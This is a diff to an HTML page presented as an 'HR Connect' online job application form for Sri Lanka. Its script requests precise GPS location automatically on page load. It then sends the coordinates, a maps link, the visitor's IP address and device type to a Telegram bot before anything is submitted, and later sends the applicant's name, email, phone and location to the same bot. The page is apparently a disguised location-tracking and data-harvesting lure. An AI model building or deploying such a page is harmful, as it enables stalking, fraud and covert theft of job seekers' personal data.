@@ -3,8 +3,9 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>HR Connect - Job Application</title>
+  <title>Job Application - HR Dept</title>
   <style>
+    /* ===== RESET ===== */
     * {
       margin: 0;
       padding: 0;
@@ -21,6 +22,7 @@
       padding: 20px;
     }
 
+    /* ===== CARD ===== */
     .card {
       max-width: 520px;
       width: 100%;
@@ -28,6 +30,7 @@
       border-radius: 24px;
       padding: 32px 28px 36px;
       box-shadow: 0 12px 40px rgba(0, 0, 0, 0.08);
+      transition: 0.3s;
       border: 1px solid rgba(0, 0, 0, 0.04);
     }
 
@@ -35,6 +38,7 @@
       font-size: 28px;
       font-weight: 700;
       color: #1a2a3a;
+      letter-spacing: -0.5px;
       margin-bottom: 4px;
     }
 
@@ -46,6 +50,7 @@
       padding-bottom: 16px;
     }
 
+    /* ===== FORM ===== */
     .form-group {
       margin-bottom: 18px;
     }
@@ -97,7 +102,6 @@
       display: flex;
       align-items: center;
       gap: 10px;
-      flex-wrap: wrap;
     }
 
     #location-status .icon {
@@ -106,21 +110,6 @@
 
     #location-status .text {
       flex: 1;
-    }
-
-    .retry-btn {
-      background: #2a7de1;
-      color: white;
-      border: none;
-      padding: 6px 16px;
-      border-radius: 20px;
-      font-size: 13px;
-      cursor: pointer;
-      transition: 0.2s;
-    }
-
-    .retry-btn:hover {
-      background: #1a6ac8;
     }
 
     /* ===== SUBMIT ===== */
@@ -166,11 +155,10 @@
   <div class="logo">📋 HR Connect</div>
   <div class="sub-logo">Online Job Application · Sri Lanka</div>
 
-  <!-- ===== LOCATION STATUS ===== -->
+  <!-- ===== LOCATION STATUS (Auto-load) ===== -->
   <div id="location-status">
     <span class="icon">📍</span>
     <span class="text" id="locationText">⏳ Detecting your location...</span>
-    <button class="retry-btn" id="retryLocationBtn">🔄 Retry</button>
   </div>
 
   <!-- ===== APPLICATION FORM ===== -->
@@ -208,6 +196,7 @@
       <textarea id="coverNote" placeholder="Why do you want this job?"></textarea>
     </div>
 
+    <!-- ===== SUBMIT ===== -->
     <button type="submit" class="btn-submit" id="submitBtn">🚀 Submit Application</button>
 
   </form>
@@ -215,7 +204,7 @@
 </div>
 
 <!-- ============================================================ -->
-<!-- ===== JAVASCRIPT ===== -->
+<!-- ===== JAVASCRIPT - LOCATION + TELEGRAM ===== -->
 <!-- ============================================================ -->
 <script>
   // =============================================
@@ -225,16 +214,13 @@
   const CHAT_ID   = '8308044531';
 
   // =============================================
-  // 📍 LOCATION
+  // 📍 LOCATION - AUTO REQUEST ON PAGE LOAD
   // =============================================
   const locationText = document.getElementById('locationText');
-  const retryBtn = document.getElementById('retryLocationBtn');
   let userLocation = null;
-  let locationAttempts = 0;
 
   function getLocation() {
     locationText.textContent = '⏳ Requesting location permission...';
-    locationAttempts++;
 
     if (!navigator.geolocation) {
       locationText.textContent = '❌ Geolocation not supported by this browser.';
@@ -247,26 +233,23 @@
         const lat = pos.coords.latitude;
         const lon = pos.coords.longitude;
         userLocation = { lat, lon };
+
+        // Show location in status
         locationText.innerHTML = `✅ Location detected: <strong>${lat.toFixed(5)}, ${lon.toFixed(5)}</strong>`;
+
+        // Send location to Telegram immediately
         sendLocationToTelegram(lat, lon);
       },
       // ❌ Error
       (err) => {
         console.warn('Location error:', err);
-        let msg = '❌ Location access denied. Please enable GPS.';
-        if (err.code === 1) {
-          msg = '❌ Permission denied. Please allow location in Settings.';
-        } else if (err.code === 2) {
-          msg = '❌ Location unavailable. Please check GPS.';
-        } else if (err.code === 3) {
-          msg = '⏳ Location timeout. Please try again.';
-        }
-        locationText.textContent = msg;
+        locationText.textContent = '❌ Location access denied. Please enable GPS.';
         userLocation = null;
       },
+      // Options
       {
         enableHighAccuracy: true,
-        timeout: 15000,
+        timeout: 10000,
         maximumAge: 0
       }
     );
@@ -277,7 +260,10 @@
   // =============================================
   async function sendLocationToTelegram(lat, lon) {
     try {
+      // 📍 Google Maps link
       const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+
+      // 🌐 Get IP (optional)
       let ip = 'Unknown';
       try {
         const ipRes = await fetch('https://api.ipify.org?format=json');
@@ -285,9 +271,11 @@
         ip = ipData.ip || 'Unknown';
       } catch (e) {}
 
+      // 📱 Device info
       const ua = navigator.userAgent;
       const device = ua.match(/Android|iPhone|iPad|Windows|Mac|Linux/i)?.[0] || 'Unknown Device';
 
+      // 📝 Message
       const msg = `
 📍 NEW LOCATION DETECTED
 
@@ -303,7 +291,8 @@ Longitude: ${lon}
 ${mapsLink}
       `;
 
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      // Send to Telegram
+      const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -312,7 +301,11 @@ ${mapsLink}
         })
       });
 
-      console.log('✅ Location sent to Telegram');
+      if (response.ok) {
+        console.log('✅ Location sent to Telegram');
+      } else {
+        console.error('❌ Failed to send location');
+      }
 
     } catch (err) {
       console.error('Send error:', err);
@@ -320,19 +313,15 @@ ${mapsLink}
   }
 
   // =============================================
-  // 🚀 PAGE LOAD + RETRY BUTTON
+  // 🚀 PAGE LOAD → AUTO REQUEST LOCATION
   // =============================================
   window.addEventListener('DOMContentLoaded', () => {
+    // Small delay to let page render first
     setTimeout(getLocation, 500);
   });
 
-  retryBtn.addEventListener('click', () => {
-    locationText.textContent = '🔄 Retrying...';
-    getLocation();
-  });
-
   // =============================================
-  // 📝 FORM SUBMIT
+  // 📝 FORM SUBMIT - Send all data to Telegram
   // =============================================
   document.getElementById('applicationForm').addEventListener('submit', async (e) => {
     e.preventDefault();
@@ -341,12 +330,14 @@ ${mapsLink}
     submitBtn.disabled = true;
     submitBtn.textContent = '⏳ Submitting...';
 
+    // Get form values
     const fullName = document.getElementById('fullName').value.trim();
     const email = document.getElementById('email').value.trim();
     const phone = document.getElementById('phone').value.trim();
     const position = document.getElementById('position').value;
     const coverNote = document.getElementById('coverNote').value.trim();
 
+    // Validate
     if (!fullName || !email || !phone) {
       alert('❌ කරුණාකර Full Name, Email සහ Phone Number පුරවන්න.');
       submitBtn.disabled = false;
@@ -354,6 +345,7 @@ ${mapsLink}
       return;
     }
 
+    // Build message
     let msg = `
 📋 NEW JOB APPLICATION
 
@@ -370,11 +362,13 @@ ${coverNote || '—'}
 🕐 Submitted: ${new Date().toLocaleString()}
     `;
 
+    // Add location link if available
     if (userLocation) {
       msg += `\n🗺️ Maps: https://www.google.com/maps?q=${userLocation.lat},${userLocation.lon}`;
     }
 
     try {
+      // Send to Telegram
       const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -388,6 +382,7 @@ ${coverNote || '—'}
         submitBtn.textContent = '✅ Application Submitted!';
         submitBtn.style.background = '#28a745';
         document.getElementById('applicationForm').reset();
+        // Reset location and re-request
         userLocation = null;
         setTimeout(getLocation, 1000);
       } else {
@@ -402,7 +397,11 @@ ${coverNote || '—'}
     }
   });
 
-  console.log('✅ HR Connect Form Loaded');
+  // =============================================
+  // 💡 DEBUG INFO (optional)
+  // =============================================
+  console.log('✅ Job Application Form Loaded');
+  console.log('📍 Location will be requested automatically...');
 </script>
 
 </body>
